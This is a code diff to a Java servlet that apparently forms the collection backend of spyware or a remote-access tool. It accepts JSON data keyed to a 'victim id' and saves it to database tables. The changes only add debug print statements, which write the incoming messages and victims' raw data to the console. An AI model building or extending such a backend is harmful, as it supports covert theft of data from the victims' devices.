@@ -39,15 +39,20 @@ public class JSONPostServlet extends AdvancedBaseServlet {
     @Override
     protected void doAdvancedPost() throws Exception {
 
+
         //out
         final PrintWriter out = getWriter();
 
         final String dataType = getStringParameter(KEY_DATA_TYPE);
 
+
         //victim id
         final String victimId = getHeaderSecurity().getVictimId();
         final boolean hasError = super.getBooleanParameter(KEY_ERROR);
         final String message = getStringParameter(KEY_MESSAGE);
+
+        System.out.println("JSON Post invoked : " + message);
+
 
         final Delivery delivery = new Delivery(victimId, hasError, message, dataType, -1);
         final Deliveries deliveries = Deliveries.getInstance();
@@ -64,8 +69,11 @@ public class JSONPostServlet extends AdvancedBaseServlet {
                     try {
                         final JSONArray jaData = new JSONArray(data);
 
+                        System.out.println("DATA : " + data);
+
                         //The delivery is not about the binary, but TEXT, so we need to save the data to the appropriate db table.
                         final BaseTable dbTable = BaseTable.Factory.getTable(dataType);
+
 
                         dbTable.addv2(victimId, jaData);
 
@@ -84,6 +92,7 @@ public class JSONPostServlet extends AdvancedBaseServlet {
 
                 } else {
                     //Data is null!
+                    System.out.println("Data is null");
                     throw new Delivery.DamagedPackageException("Data can't be null");
                 }
 
@@ -96,9 +105,11 @@ public class JSONPostServlet extends AdvancedBaseServlet {
             }
 
         } catch (Delivery.DamagedPackageException e) {
+            System.out.println("Delivery damaged");
             e.printStackTrace();
             delivery.setServerError(true);
             delivery.setServerErrorMessage(e.getMessage());
+
             deliveries.addv2(delivery);
             throw new Exception(e.getMessage());
         }
